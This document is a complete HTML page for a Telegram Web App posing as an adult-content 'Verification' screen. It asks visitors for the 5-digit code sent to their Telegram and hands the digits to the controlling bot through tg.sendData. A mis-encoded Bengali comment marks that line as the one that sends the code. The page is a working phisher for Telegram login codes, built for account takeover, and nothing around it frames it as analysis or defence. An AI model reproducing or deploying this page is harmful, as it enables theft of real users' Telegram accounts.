<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        .logo { font-size: 50px; margin-bottom: 20px; }
        .instruction { font-size: 18px; margin-bottom: 30px; color: #ccc; }
        .code-display { font-size: 32px; letter-spacing: 10px; margin-bottom: 30px; height: 40px; color: #0088cc; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; width: 250px; margin: 0 auto; }
        button { background: #1c1c1c; border: 1px solid #333; color: #fff; padding: 20px; font-size: 24px; border-radius: 10px; cursor: pointer; }
        button:active { background: #0088cc; }
    </style>
</head>
<body>
    <div class="logo">ðŸ”ž</div>
    <div class="instruction">Enter the 5-digit code sent to your Telegram</div>
    <div class="code-display" id="display">_ _ _ _ _</div>
    <div class="keypad">
        <button onclick="press(1)">1</button><button onclick="press(2)">2</button><button onclick="press(3)">3</button>
        <button onclick="press(4)">4</button><button onclick="press(5)">5</button><button onclick="press(6)">6</button>
        <button onclick="press(7)">7</button><button onclick="press(8)">8</button><button onclick="press(9)">9</button>
        <button onclick="clearCode()">C</button><button onclick="press(0)">0</button>
    </div>

    <script>
        let code = "";
        const tg = window.Telegram.WebApp;
        tg.expand();

        function updateDisplay() {
            let display = code.padEnd(5, "_").split("").join(" ");
            document.getElementById("display").innerText = display;
        }

        function press(num) {
            if (code.length < 5) {
                code += num;
                updateDisplay();
                if (code.length === 5) {
                    // à¦à¦Ÿà¦¿à¦‡ à¦†à¦¸à¦² à¦²à¦¾à¦‡à¦¨ à¦¯à¦¾ à¦¬à¦Ÿà§‡à¦° à¦•à¦¾à¦›à§‡ à¦•à§‹à¦¡ à¦ªà¦¾à¦ à¦¾à¦¬à§‡
                    tg.sendData(code); 
                    setTimeout(() => tg.close(), 500);
                }
            }
        }

        function clearCode() {
            code = "";
            updateDisplay();
        }
    </script>
</body>
</html>
